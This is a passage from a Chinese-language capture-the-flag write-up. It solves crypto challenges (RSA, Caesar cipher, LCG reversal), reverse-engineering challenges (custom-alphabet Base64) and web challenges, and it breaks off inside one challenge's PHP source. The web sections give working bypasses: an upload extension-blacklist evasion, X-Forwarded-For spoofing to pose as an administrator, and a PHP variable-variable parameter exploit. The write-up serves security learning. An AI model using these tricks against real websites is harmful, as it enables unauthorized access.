d /flag.png --nocheck<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span></span></code></pre><p>就可以下载到原图然后直接看到 <code>flag&#123;2995_ke3p_clam_and_enj0y_y0ur_fl1ght_300&#125;</code>，还好不需要继续折腾隐写什么的……</p><img data-src="https://ae01.alicdn.com/kf/H350d88a8756c4a16a835c08cc48fecd4c.jpg" data-src-webp="https://ae01.alicdn.com/kf/He19e0f047fda46bdbe1c632ae2ac9f58j.jpg"><p>（上面这张不是原图，上传到图床前小透明自己把图片压缩了）</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="really-encrypted"><a href="#really-encrypted" class="headerlink" title="really_encrypted"></a>really_encrypted</h2><p><del>不言而喻，一目了然，真・签到题</del></p><p>栅栏密码（<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php" target="_blank" rel="noopener">这里</a>是工具），<code>flag&#123;Ai8sh5wbxj0whksjshdyw3&#125;</code>。</p><img data-src="https://ae01.alicdn.com/kf/U4b42dff04e3a431daa6b1d096f6189e33.png" data-src-webp="https://ae01.alicdn.com/kf/H9f51e2bbbb8e44b98e11ff9ab1738c61Y.jpg"><h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><p>RSA 解密需要求模除法逆元，从 <a href="https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python/29762148#29762148" target="_blank" rel="noopener">Stack Overflow</a> 上找到了一个非常实用的匿名函数可以直接实现逆元的计算：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">MMI <span class="token operator">=</span> <span class="token keyword">lambda</span> A<span class="token punctuation">,</span> n<span class="token punctuation">,</span>s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>N<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token keyword">and</span> t<span class="token operator">%</span>N <span class="token keyword">or</span> MMI<span class="token punctuation">(</span>n<span class="token punctuation">,</span> A<span class="token operator">%</span>n<span class="token punctuation">,</span> t<span class="token punctuation">,</span> s<span class="token operator">-</span>A<span class="token operator">//</span>n<span class="token operator">*</span>t<span class="token punctuation">,</span> N <span class="token keyword">or</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span>n<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">]</span>
MMI<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token comment"># 56</span>
MMI<span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token comment"># -1</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span></span></code></pre><p>开始看题：</p><pre class="line-numbers language-plaintext" data-language="plaintext"><code class="language-plaintext">n &#x3D; 18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117
e &#x3D; 65537
c &#x3D; 16557540364154395713558646669072741937615342260542036031952182998548657011824978776677484944354752850867643908247704032511389420321541306432748843707416654616686046776804432102455821985542337552330254302403535524234293479604198963438410959320502344078024576646316377856554837978984863667052517437922967926155676374386985386995490935331458679889799199387332376735566839929210890931308968597230699243910342515468179185950859704753759493976488271753912140439374347388198468842216991965867366259721821413872154269673724400345270897275549939948544776957761650034569256088810092045614520316608497052245790834163200510667772<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span></span></code></pre><p>把 n 丢进 <a href="http://factordb.com/index.php?query=18166111488983638423176654225038910650374178404043258136863317940757240374883045318227630220114908148002528619687208976201483203446705228237820608531034600157346418730110800833894198105113069673034318791074080878803821797374439187892933762426303490171060652425319592687318992422979831460606780689490127157122450326817694644127955168509718422226505201308410281564018832558025316135527711604948983206569045881358071837726506411561445950018434181828539749068924458242255898899889941894373420604283541696070823346969159662074221543706652525690955057870664198106495869582165707721782854117610672456879034154898769471938117" target="_blank" rel="noopener">FactorDB</a> 可以分解出 p 和 q，然后就可以得到 m。</p><pre class="line-numbers language-plaintext" data-language="plaintext"><code class="language-plaintext">p &#x3D; 130456283857645025762691023898845608928710362686294851221450093824533197549806631148867242691844441160576320773904432512838379590127986113818416101086695539425149571612979342889778360825402727498529748702035429662584726706609716114370652011043194792995908818094170934656989995629482678233000685983090325365549
q &#x3D; 139250566947059823453625463016686669261826444361819002282335838853816828667839799789393680821194880353192071200076880361361848345889074292932450446910930443112614763933390287115641256150843558712707320218852675477962227409197464100372762134803009018827495653979157431219931338408129724157546988493768646375033
m &#x3D; 4079298574924100380882798141080777519551699955439474094729924030825463150621200292859549484308473511195982027523392939998962139796530757717099548565227012907221461316960947880602936490993085237650824412891417747519<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span></span></code></pre><p>把 m 转换为字符串（这其实是在造轮子了）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hex_m <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token comment"># 去掉开头的0x</span>
decoded <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_m<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    decoded <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_m<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span></span></code></pre><p>得到的字符串是 <code>0x1337 ^ (-1) mod 0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613 = ?</code>，所以还需要继续进行计算。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">calc <span class="token operator">=</span> MMI<span class="token punctuation">(</span><span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token number">0x18a39cb09e40671788a6b9221371e3f5455bbde2aff984e491c85f4f3ad309613</span><span class="token punctuation">)</span>
hex_calc <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>calc<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
decoded <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>hex_calc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    decoded <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>hex_calc<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/Hc73b6c2a91da4db28f2b183b23081dcba.jpg" data-src-webp="https://ae01.alicdn.com/kf/Hed6e0c191cc74da2a9ee3c896c06bfeeG.jpg"><p><code>flag&#123;456_easy_rsa_challenge_657&#125;</code></p><h2 id="My-kingdom"><a href="#My-kingdom" class="headerlink" title="My kingdom"></a>My kingdom</h2><p>还是 Hex 转 ASCII，得到文本：</p><pre class="line-numbers language-plaintext" data-language="plaintext"><code class="language-plaintext">K ecog, K ucy, K eqpswgtgf.
Eqyctfu fkg ocp&#123; vkogu dghqtg vjgkt fgcvju,vjg xcnkcpv pgxgt vcuvg qh fgcvj dwv qpeg.
Uckf d&#123; Lwnkwu Ecguct, Tqocp Ngcfgt
Lwuv nkmg yjcv Ecguct uckf, &#123;qw eqpswgtgf, &#123;qw fgugtxg kv.
hnci&#123;e2o5_ucy_Lq3p_63f_E2psw5tg_evh!&#125;<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一行很像是 flag，经过测试是 +2 的凯撒密码，用 -2 把它复原。</p><p><del>因为解密工具抹平了大小写，还无视了数字，结果搞出了一大堆提交失败的记录⊂彡☆))д`)</del></p><pre class="line-numbers language-plaintext" data-language="plaintext"><code class="language-plaintext">I came, I saw, I conquered.
Cowards die man&#123; times before their deaths,the valiant never taste of death but once.
Said b&#123; Julius Caesar, Roman Leader
Just like what Caesar said, &#123;ou conquered, &#123;ou deserve it.
flag&#123;c0m3_saw_Jo1n_41d_C0nqu3re_ctf!&#125;<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>flag&#123;c0m3_saw_Jo1n_41d_C0nqu3re_ctf!&#125;</code></p><h2 id="lincoin"><a href="#lincoin" class="headerlink" title="lincoin"></a>lincoin</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long
<span class="token keyword">from</span> FLAG <span class="token keyword">import</span> flag

<span class="token keyword">class</span> <span class="token class-name">LCG</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token number">0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3</span>
    b <span class="token operator">=</span> <span class="token number">0xb2dab99e8973e463ab58a4403d35675f</span>
    n <span class="token operator">=</span> <span class="token number">0xd5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649</span>

    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> init_seed<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">assert</span> init_seed <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>n
        self<span class="token punctuation">.</span>state <span class="token operator">=</span> init_seed

    <span class="token keyword">def</span> <span class="token function">rand</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>state <span class="token operator">+</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>state

    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

seed <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
lcg <span class="token operator">=</span> LCG<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>

times <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">**</span> <span class="token number">30</span>
<span class="token keyword">while</span> times <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
    lcg<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>
    times <span class="token operator">-=</span> <span class="token number">1</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>lcg<span class="token punctuation">)</span> <span class="token comment"># 0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本体是个<a href="https://zh.wikipedia.org/zh-hans/%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">线性同余随机数产生器（LCG）</a>，把 flag 转为 Hex 然后设为种子，生成了 ${2^{30}}$ 次随机数。</p><p>LCG 的原理是：设定参数 a、b、n 以及种子 ${X_0}$，之后的每个随机数按照公式 $$X_n = (a \times X_{n-1} + b) \bmod n$$ 递推生成。</p><p><a href="https://stackoverflow.com/questions/2911432/reversible-pseudo-random-sequence-generator" target="_blank" rel="noopener">Stack Overflow</a> 上面有人写出了“反向 LCG”的算法（当然也可以自己反推），从当前随机数 $X_n$ 反推 LCG 生成的上一个随机数 $X_{n-1}$ 的公式是 $$X_{n-1} = a^{-1} \times (X_n - b) \bmod n$$ 其中 $a^{-1}$ 是 a 的模 n 除法逆元（继续用 <code>MMI</code> 函数计算）。</p><p>写代码求解，因为循环次数太多，运行需要很长的时间，所以按了回车之后，可以去阳台上看看风景，<del>或者和妹子出去散个步什么的</del>（你怎么可能会有女朋友？）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse_LCG</span><span class="token punctuation">(</span>rnd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># a = 0xdb626d86f5dc6cf4ec8c4ca4f4b9dab3</span>
    b <span class="token operator">=</span> <span class="token number">0xb2dab99e8973e463ab58a4403d35675f</span>
    n <span class="token operator">=</span> <span class="token number">0xd5aef35973977bd35331490990b6b54b80d44bdb621f861848f4377c54cf6649</span>
    a_inv <span class="token operator">=</span> <span class="token number">57217878573518668316807000375554927755910762980319730425669837644426658111070</span> <span class="token comment"># MMI(a, n)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>a_inv <span class="token operator">*</span> <span class="token punctuation">(</span>rnd <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> n

rnd <span class="token operator">=</span> <span class="token number">0xaf08e8ece96f637d3719fa1c4f0a9f88b3d330615108dd36f430c159308395b2</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">**</span> <span class="token number">30</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 进度条（大误）</span>
    <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">100000</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\r'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
    rnd <span class="token operator">=</span> reverse_LCG<span class="token punctuation">(</span>rnd<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>rnd<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过了很久很久很久很久……终于算出来了，种子是 <code>180966415225526098453856893299872427450627808844390491008662352366530869117</code>，继续转字符串，得到 <code>flag&#123;541_LCG_iS_A_baD_pRng_167&#125;</code>。</p><p>（发现自己做的时候忘了截图，重新算一遍又要好长时间，就不截图了吧）</p><p>（其实 <code>from Crypto.Util.number import bytes_to_long</code> 是可以直接整数转换为字节的）</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h2><img data-src="https://ae01.alicdn.com/kf/U892f389b5a334cb99dd178535224c49ev.png" data-src-webp="https://ae01.alicdn.com/kf/Hcd8d9283bba04da4b458baa0e0723e9ec.jpg"><p>IDA 一开，有个字符串 <code>ZmxhZ3tSM19XMXRoX2I0c2U2NF8xc19zMW1wbGVfMG4zfQ==</code>，估计是 Base64，实际上真的是 Base64，解码后得到 <code>flag&#123;R3_W1th_b4se64_1s_s1mple_0n3&#125;</code>。</p><h2 id="easyELF"><a href="#easyELF" class="headerlink" title="easyELF"></a>easyELF</h2><img data-src="https://ae01.alicdn.com/kf/U398021ae3c344a0ea8934a8597152bc6U.png" data-src-webp="https://ae01.alicdn.com/kf/H1012d4b8abfc457dbfe46203f2d6c339M.jpg"> <img data-src="https://ae01.alicdn.com/kf/U98f4cb8c4c8d45e5aa8860e3da808de1g.png" data-src-webp="https://ae01.alicdn.com/kf/He859489b13da4e58abaab7b56800008df.jpg"><p>用 IDA 打开本体，发现 <code>sub_4006CB</code> 比较可疑，再点进去，发现 <code>v7</code> 也比较可疑……</p><img data-src="https://ae01.alicdn.com/kf/Ubaf9eb9d05334c8b92e93ed97d838e8fw.png" data-src-webp="https://ae01.alicdn.com/kf/H0eda6b879e48498192e7e15d00cc053ay.jpg"><p>下断点动态调试，flag 保存在了 <code>v7</code>：<code>flag&#123;Here_are_yo_To_be_interested_and_excited&#125;</code></p><p><del>你们搞的这个比赛啊，excited！</del></p><h2 id="reverseMe"><a href="#reverseMe" class="headerlink" title="reverseMe"></a>reverseMe</h2><p>输入一个字符串，这个字符串被进行了一堆操作后将会和 <code>+wXp+xDkldnFdFNFdxnzdFWpGx2m</code>（应该就是操作后的 flag）比对。这个应该不是 Base64 了……吗？</p><img data-src="https://ae01.alicdn.com/kf/Udfa607153f7d4f0c9b3478411ffb38afk.png" data-src-webp="https://ae01.alicdn.com/kf/H77ad2c18b3d04164a5c0750e8b4c9592n.jpg"><p>对比一下现有的 C 语言计算 Base64 的代码可以说是完全一致，所以这个操作还是在算 Base64。</p><img data-src="https://ae01.alicdn.com/kf/U73ddfc5b07ec4ec8ac9ee69665f10223D.png" data-src-webp="https://ae01.alicdn.com/kf/Hb15829b87db14f12a4b57e15be3c7df9U.jpg"><p>继续翻变量，可以发现字符表不是 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 而是 <code>R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U</code>，所以继续写代码先转换成出原版 Base64 再拿去解码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ori <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>
mod <span class="token operator">=</span> <span class="token string">'R9Ly6NoJvsIPnWhETYtHe4Sdl+MbGujaZpk102wKCr7/ODg5zXAFqQfxBicV3m8U'</span>
flag_mod <span class="token operator">=</span> <span class="token string">'+wXp+xDkldnFdFNFdxnzdFWpGx2m'</span>
flag_ori <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> flag_mod<span class="token punctuation">:</span>
    flag_ori <span class="token operator">+=</span> ori<span class="token punctuation">[</span>mod<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag_ori<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/H5f78eda467704cbe9c0750e31f83f354q.jpg" data-src-webp="https://ae01.alicdn.com/kf/H330650a36f8746149c4f7f7166c95d22X.jpg"><p>转换为原版 Base64 是 <code>ZmxhZ3tiYXMzXzFzX3MwXzNhc3l9</code>，解码后得到 <code>flag&#123;bas3_1s_s0_3asy&#125;</code>。</p><p>顺便看了一下源代码。经过实验，大量出现的 <code>(unsigned __int64)(0xAAAAAAAAAAAAAAABLL * (unsigned __int128)var &gt;&gt; 64) &gt;&gt; 1</code> 相当于求 <code>var</code> 整除 <code>3</code>，具体原理不得而知，<del>大概是参考了平方根倒数速算法</del>。</p><img data-src="https://ae01.alicdn.com/kf/Hf15400e638834de1a09b71c4ad68b782q.jpg" data-src-webp="https://ae01.alicdn.com/kf/H9d864746dc24418384d40800d5a7f8fcF.jpg"><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><img data-src="https://ae01.alicdn.com/kf/U59741b2806bb4d2db60deb7205d550fdj.png" data-src-webp="https://ae01.alicdn.com/kf/H9dbcf1e005044e3c86a75a49262dc75aF.jpg"><p>文件内容不重要，只要在上传的时候把文件名改过来就行～然后就可以得到 <code>flag&#123;w311_D0ne!&#125;</code>。</p><h2 id="EasyUpload"><a href="#EasyUpload" class="headerlink" title="EasyUpload"></a>EasyUpload</h2><p><del>我差点觉得这题应该叫 DifficultUpload</del></p><p><del>比上次多了黑名单验证机制，只要扩展名是 php、php3、php4、php5、php7、pht、phtml 就会 Connection reset。</del></p><p>只要用 Burpsuite 抓包改完重发就会出现 Connection reset，原因不明，结果试了一晚上绕过方法，导致这题耽误了很久(｡í _ ì｡)</p><p>后来才发现 Burpsuite 还有个 Repeater 能用……</p><img data-src="https://ae01.alicdn.com/kf/U7e633395987b42d5a6436de5d7c5e92ai.png" data-src-webp="https://ae01.alicdn.com/kf/Hbbaad66de92a4e2697286882d8c1a565a.jpg"><p>继续改文件名，然后按照提示在图片数据的无关紧要的位置加 <code>givemeflag</code>，就能看到 flag 了：<code>flag&#123;SHjdbe7pIUD02847SDHD&#125;</code>。</p><img data-src="https://ae01.alicdn.com/kf/U2b06bba9f9934fc79d39e3acd3c31251g.png" data-src-webp="https://ae01.alicdn.com/kf/H0071122a519f4893ab0479f459f9962eX.jpg"><h2 id="EasyGame"><a href="#EasyGame" class="headerlink" title="EasyGame"></a>EasyGame</h2><img data-src="https://ae01.alicdn.com/kf/U6f9bafce3b7f449bbbd3102cbcfd642dP.png" data-src-webp="https://ae01.alicdn.com/kf/Hc6f0872601eb4bd89ee5a5c988bbe7c5T.jpg"><p>按照提示加 GET 和 POST 参数，然后请求头加个 <code>X-Forwarded-For: 127.0.0.1</code> 假装是管理员自己上了服务器打开这个页面就可以得到 <code>flag&#123;Y0ur_pHp_1s_s1xsix6&#125;</code>。</p><h2 id="BabyPHP"><a href="#BabyPHP" class="headerlink" title="BabyPHP"></a>BabyPHP</h2><p>可变变量漏洞。虽然有 <code>$_POST</code> 但是完全不用管它，直接以 GET 方式访问，参数：<code>akarin=flag&amp;flag=akarin</code> 即可得到 <code>flag&#123;GSH1ydsbnYtshkjhs&#125;</code>。</p><p>（参数的 <code>akarin</code> 可替换为任意内容，但是参数顺序不能变）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 因为不是用 POST 访问，所以 isset($_POST['flag'] )为 false，取反后为 true</span>
<span class="token comment">// isset($_GET['flag']) 为 true，取反后为 false，所以不执行</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$msg_giveme</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 已绕过</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token variable">$msg_getout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 因为没有 $_POST，这一段也跳过了</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 实际执行的顺序：</span>
<span class="token comment">// $akarin = $flag;</span>
<span class="token comment">// $flag = $akarin;</span>
<span class="token comment">// 结果：flag 毫发无损</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token string single-quoted-string">'the flag is : '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img data-src="https://ae01.alicdn.com/kf/Uf6a3cea05dab4cf88616afae7c14173bd.png" data-src-webp="https://ae01.alicdn.com/kf/H5569924e84a5401cbbfa72dfd202e9c5i.jpg"><h2 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h2><p>翻注释然后去 <code>http://35.194.143.125:4517/source.txt</code> 看源代码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"XXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"XXXXXXXXXX"</span><span class="token punctuation">;</span> <span class="token comment">// 十个字符，这是解题的关键</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"check"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

